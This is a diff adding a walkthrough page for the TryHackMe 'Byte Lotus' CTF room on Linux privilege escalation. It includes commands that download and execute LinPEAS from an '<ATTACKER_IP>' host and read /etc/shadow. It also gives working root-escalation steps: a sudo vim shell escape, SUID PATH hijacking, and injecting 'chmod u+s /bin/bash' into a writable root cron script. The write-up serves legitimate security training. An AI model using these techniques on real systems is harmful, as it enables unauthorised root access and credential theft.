@@ -1,0 +1,193 @@
+---
+title: "Byte Lotus Privilege Escalation — Getting Root Access"
+sidebarTitle: "Privilege Escalation"
+description: "Privilege escalation phase for THM Byte Lotus: local enumeration, SUID binaries, sudo misconfigurations, and reaching root."
+---
+
+You're on the box with a low-privilege shell — now it's time to turn that foothold into full root access. Privilege escalation on Linux almost always comes down to one of a handful of vectors: a misconfigured `sudo` policy, a SUID binary that can be abused, a world-writable cron job, credentials left in a config file, or a running service vulnerable to a known exploit. The goal of this phase is systematic enumeration followed by targeted exploitation of whatever the box surfaces.
+
+<Note>
+  Document every command you run and every interesting file you find during this phase. Privilege escalation paths in CTF rooms are intentional — if something looks odd (an unusual SUID binary, a cron job running as root, a writable service config), it's almost certainly the intended vector.
+</Note>
+
+## Local Enumeration
+
+Start with automated enumeration to catch the obvious wins quickly, then supplement with focused manual checks.
+
+### LinPEAS
+
+LinPEAS is the go-to automated Linux privilege escalation enumeration script. Transfer it from your attack machine to the target:
+
+```bash
+# On your attack machine — serve linpeas over HTTP
+python3 -m http.server 8000
+
+# On the target shell — download and execute
+wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
+```
+
+LinPEAS colour-codes its output by severity — focus on the **red/yellow** highlighted entries first. Key sections to review:
+
+- **Sudo version** and known CVEs (e.g. CVE-2021-4034 PwnKit)
+- **SUID/SGID binaries** — anything non-standard
+- **Interesting files** — writable `/etc/passwd`, world-writable cron scripts
+- **Network services** — anything listening only on localhost that might be exploitable from the inside
+- **Credentials** — hardcoded passwords in config files, `.bash_history`, environment variables
+
+### LinEnum (Alternative)
+
+```bash
+wget http://<ATTACKER_IP>:8000/LinEnum.sh -O /tmp/linenum.sh
+chmod +x /tmp/linenum.sh
+/tmp/linenum.sh -t | tee /tmp/linenum_output.txt
+```
+
+## Manual Checks
+
+Never rely solely on automated tools. The following manual checks take under two minutes and frequently surface the intended CTF vector directly.
+
+### Sudo Policy
+
+```bash
+sudo -l
+```
+
+```text
+Matching Defaults entries for www-data on bytelotus:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User www-data may run the following commands on bytelotus:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+```
+
+A `NOPASSWD` entry for any binary is almost always exploitable. Cross-reference every sudo-allowed binary against [GTFOBins](https://gtfobins.github.io/).
+
+### SUID Binaries
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+```text
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/umount
+/usr/sbin/pppd
+/usr/local/bin/lotus-utils       ← non-standard binary, investigate this
+```
+
+Standard system SUID binaries are expected. Any custom or non-standard binary (like `lotus-utils` above) warrants immediate investigation — run `strings` on it, check its permissions, and look for writable paths it calls.
+
+### Cron Jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+cat /var/spool/cron/crontabs/root 2>/dev/null
+```
+
+```text
+# /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+* * * * * root /opt/scripts/cleanup.sh
+```
+
+A root-owned cron job that runs a script you have write access to is a trivial escalation path — inject a reverse shell or `chmod u+s /bin/bash` command into the script.
+
+### Sensitive Files
+
+```bash
+ls -la /etc/passwd
+ls -la /etc/shadow
+cat ~/.bash_history
+find / -name "*.conf" -readable 2>/dev/null | head -20
+find / -name "config.php" -readable 2>/dev/null
+```
+
+Web application configuration files frequently contain database credentials that are reused as system user passwords.
+
+## Exploiting the Vector
+
+### Vector 1 — Sudo Misconfiguration (vim)
+
+If `sudo -l` reveals that `vim` can be run as root without a password, escalation is a single command:
+
+```bash
+sudo vim -c ':!/bin/bash'
+```
+
+You'll drop directly into a root shell:
+
+```text
+root@bytelotus:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+<Tip>
+  [GTFOBins](https://gtfobins.github.io/) catalogues privilege escalation techniques for hundreds of Linux binaries via sudo, SUID, capabilities, and more. If `sudo -l` or your SUID search surfaces any binary you don't immediately know how to abuse, GTFOBins should be your first stop.
+</Tip>
+
+### Vector 2 — SUID Binary Abuse
+
+If a non-standard SUID binary is present, investigate what it does and whether it calls any external programs using a relative path (exploitable via PATH hijacking):
+
+```bash
+strings /usr/local/bin/lotus-utils
+```
+
+If the binary calls something like `cat` or `cp` without an absolute path, you can hijack it:
+
+```bash
+# Create a malicious 'cat' in a directory you control
+echo '/bin/bash -p' > /tmp/cat
+chmod +x /tmp/cat
+
+# Prepend your directory to PATH
+export PATH=/tmp:$PATH
+
+# Run the SUID binary — it calls your 'cat' as root
+/usr/local/bin/lotus-utils
+```
+
+### Vector 3 — Writable Cron Script
+
+If you identified a world-writable script that runs as root via cron:
+
+```bash
+# Verify write access
+ls -la /opt/scripts/cleanup.sh
+
+# Inject a privilege escalation payload
+echo 'chmod u+s /bin/bash' >> /opt/scripts/cleanup.sh
+
+# Wait up to 60 seconds for the cron to fire, then:
+/bin/bash -p
+```
+
+```text
+bash-5.0# id
+uid=1001(www-data) gid=1001(www-data) euid=0(root) groups=1001(www-data)
+```
+
+### Confirming Root
+
+Once you believe you have root-level access, confirm it:
+
+```bash
+id
+whoami
+cat /etc/shadow | head -3
+```
+
+If `id` returns `uid=0(root)` — or you have an effective UID of 0 — you're root. Head to the [Flags](/tryhackme/byte-lotus/flags) page to collect your trophies.
